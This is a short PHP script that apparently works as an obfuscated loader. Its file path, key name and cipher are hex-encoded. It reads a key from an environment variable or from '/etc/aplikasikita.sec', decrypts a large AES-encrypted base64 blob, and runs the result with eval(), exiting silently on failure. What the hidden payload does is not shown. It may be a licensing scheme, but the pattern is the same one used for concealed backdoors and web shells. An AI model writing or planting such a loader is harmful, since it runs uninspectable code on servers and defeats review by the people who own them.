<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('R431KrT+xAiVTvLkzc0Mmw==');

$c=base64_decode(

'mppj0ixXNs+98x7Csy32yUEy9MG1pfyqyo4iJCy+byvnzszdJOetXTy6slIGPsqfp1Ep3UyYsAr4' .
'2ff7HUNRUMsP3jQwXAspoFanA9jqJNFWPQIg+r2WBOOV0k+6zWb/Hc33rcNR9zTMs09+J5f3TgIk' .
'voBykGQCJdVnL9Hn4n3fxa+HluiDNr6DN9t3Wflp6BUsWsnoM4E7lKhah5ofQORk/gDjYQQLF1og' .
'JgMeDY6tUG9JPy0i5Lnn4Y049kFzhtXQ9MdZyM5ZM83IFIMJIXEMhTxt4J5YG+MKeBOibGh2VMQb' .
'VXWFWmM29mlgNdoLRNUUzDA0lvA0X8JQTWyzia1EZSR37mscGHEi8jfV9FfaSQ5D2Qd53R7V38oB' .
'm8/zbLPMbZ7Twut4Kl0bAO6dcJvu+wAxKVoOKzPuOnL6PAUP2Zc8+BmtB/0OEJO/aFbs6sUUqvvJ' .
'8UvYFowTq9AbE8U3mt9jOB/W4MT5rJl587FHt4Bol7k0D2cHBOHrq7O3VLVdzUCRrOrIwol1CRky' .
'h5dwxeU1FPtag/FewYW0oNvwJQF/izxTmExfGy19ZgLDiARPE+9BVaxhHLEuDr2CWHmn+mtSzciC' .
'aN/GrL/VE7+rNRoGvoMaIp3xHLJDzNacPssW/fqfWTmuMfVpNwE7pAXhgFHImvhj0NABk0o8dbC4' .
'GTYnVbK3qh1dp8h1ha/I+m9TrDXMHJkvUjLCfozBdagaemyynqZ/ggt9aqF9wCfXAQ0YTCjwpqfE' .
'azaXtlXh4YGgGQJRzuFgvqMpZ4j/pE328A9kX/Mq9WD05BXtHKIW4I7s365M9ovVyXFy6+Bf7qbk' .
'm++q50PGftRY6WltBVlaXCwabXa8vp6/dldnGBp67EapOIwZtTIomCSpXZneRm/Z3R2eEezp6xAZ' .
'/wTVngupYmsOLZfvW6BfekNLz18nzq7AkHqe6fOA+Sn+WZjsVnKo8sENUNruYm7LBloGgA4ZSEJx' .
'6udKxAfgDKcZKrV1zXjRrxhzTIpVSnhEvHwzJUvhNMkqc/tLA5R5B2ajGFKpOI7HyNPSMJCY65LT' .
'/Kr0bNm+iAb49qFhC4Pe1LtPupXndvSmioPcojDr8yz0OzOPQYMXOKQllxDHK0sDipHtO1NrKuxF' .
'oJbmD1WoXbAtasQIQNiURLblPiOn52QNULAcM8M1LEgDEfq300gr8bj+38f7bWwR3mV9FGC9EHd8' .
'BMZAtIF259J9bVgjVlYEFN7m/07gomXlQT8WlpyapNxzS+eUrtjXreW1Q5p8bLJ1qSCxmfUueF/t' .
'C99oYSmA7hCC2A0ZlybKvTrpkeiXOhIcgONfy3lpfDO18zuvo84xz25sh1R0GbBjYdrOgGjteQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

